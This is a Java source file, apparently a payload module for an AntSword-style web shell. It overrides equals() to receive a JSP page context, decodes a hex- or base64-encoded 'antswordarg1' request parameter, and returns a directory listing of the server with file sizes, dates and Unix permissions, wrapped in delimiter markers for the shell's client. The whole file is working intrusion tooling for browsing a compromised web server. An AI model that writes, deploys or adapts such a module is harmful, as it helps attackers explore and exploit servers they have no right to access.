import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.jsp.PageContext;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.attribute.PosixFileAttributes;
import java.nio.file.attribute.PosixFilePermission;
import java.text.SimpleDateFormat;
import java.util.Set;

public class Dir {
    public String encoder;
    public String cs;

    @Override
    public boolean equals(Object obj) {
        PageContext page = (PageContext) obj;
        ServletRequest request = page.getRequest();
        ServletResponse response = page.getResponse();
        encoder = request.getParameter("encoder") != null ? request.getParameter("encoder") : "";
        cs = request.getParameter("charset") != null ? request.getParameter("charset") : "UTF-8";
        StringBuffer output = new StringBuffer("");
        StringBuffer sb = new StringBuffer("");
        String tag_s = "->|";
        String tag_e = "|<-";
        String varkey1 = "antswordarg1";
        try {
            response.setContentType("text/html");
            request.setCharacterEncoding(cs);
            response.setCharacterEncoding(cs);
            String z1 = EC(decode(request.getParameter(varkey1) + "", encoder, cs), encoder, cs);
            output.append(tag_s);
            sb.append(FileTreeCode(z1));
            output.append(sb.toString());
            output.append(tag_e);
            page.getOut().print(output.toString());
        } catch (Exception e) {
            sb.append("ERROR" + ":// " + e.toString());
        }
        return true;
    }

    String EC(String s, String encoder, String cs) throws Exception {
        if (encoder.equals("hex") || encoder == "hex") return s;
        return new String(s.getBytes(), cs);
    }

    String decode(String str, String encode, String cs) throws Exception {
        if (encode.equals("hex") || encode == "hex") {
            if (str == "null" || str.equals("null")) {
                return "";
            }
            String hexString = "0123456789ABCDEF";
            str = str.toUpperCase();
            ByteArrayOutputStream baos = new ByteArrayOutputStream(str.length() / 2);
            String ss = "";
            for (int i = 0; i < str.length(); i += 2) {
                ss = ss + (hexString.indexOf(str.charAt(i)) << 4 | hexString.indexOf(str.charAt(i + 1))) + ",";
                baos.write((hexString.indexOf(str.charAt(i)) << 4 | hexString.indexOf(str.charAt(i + 1))));
            }
            return baos.toString("UTF-8");
        } else if (encode.equals("base64") || encode == "base64") {
            byte[] bt = null;
            sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();
            bt = decoder.decodeBuffer(str);
            return new String(bt, "UTF-8");
        }
        return str;
    }

    String FileTreeCode(String dirPath) throws Exception {
        File oF = new File(dirPath), l[] = oF.listFiles();
        String s = "", sT, sQ, sF = "";
        java.util.Date dt;
        String fileCode = (String) System.getProperties().get("file.encoding");
        SimpleDateFormat fm = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        for (int i = 0; i < l.length; i++) {
            dt = new java.util.Date(l[i].lastModified());
            sT = fm.format(dt);
//            sQ = l[i].canRead() ? "R" : "";
//            sQ += l[i].canWrite() ? " W" : "";
            sQ = getPermissions(l[i].toString());
            String nm = new String(l[i].getName().getBytes(fileCode), cs);
            if (l[i].isDirectory()) {
                s += nm + "/\t" + sT + "\t" + l[i].length() + "\t" + sQ + "\n";
            } else {
                sF += nm + "\t" + sT + "\t" + l[i].length() + "\t" + sQ + "\n";
            }
        }
        s += sF;
        return new String(s.getBytes(fileCode), cs);
    }

    String getPermissions(String sourceFile) {
        int ownerPermissions = 0;
        int groupPermissions = 0;
        int othersPermissions = 0;
        try {
            Path path = Paths.get(sourceFile);
            PosixFileAttributes attr;
            attr = Files.readAttributes(path, PosixFileAttributes.class, LinkOption.NOFOLLOW_LINKS);
            Set<PosixFilePermission> filePermissions = attr.permissions();

            if (filePermissions.contains(PosixFilePermission.OWNER_READ)) {
                ownerPermissions += 4;
            }
            if (filePermissions.contains(PosixFilePermission.OWNER_WRITE)) {
                ownerPermissions += 2;
            }
            if (filePermissions.contains(PosixFilePermission.OWNER_EXECUTE)) {
                ownerPermissions += 1;
            }
            if (filePermissions.contains(PosixFilePermission.GROUP_READ)) {
                groupPermissions += 4;
            }
            if (filePermissions.contains(PosixFilePermission.GROUP_WRITE)) {
                groupPermissions += 2;
            }
            if (filePermissions.contains(PosixFilePermission.GROUP_EXECUTE)) {
                groupPermissions += 1;
            }
            if (filePermissions.contains(PosixFilePermission.OTHERS_READ)) {
                othersPermissions += 4;
            }
            if (filePermissions.contains(PosixFilePermission.OTHERS_WRITE)) {
                othersPermissions += 2;
            }
            if (filePermissions.contains(PosixFilePermission.OTHERS_EXECUTE)) {
                othersPermissions += 1;
            }
        } catch (Exception ioe) {
            return "0000";
        }
        return "0" + String.valueOf(ownerPermissions) + String.valueOf(groupPermissions)
                + String.valueOf(othersPermissions);
    }
}
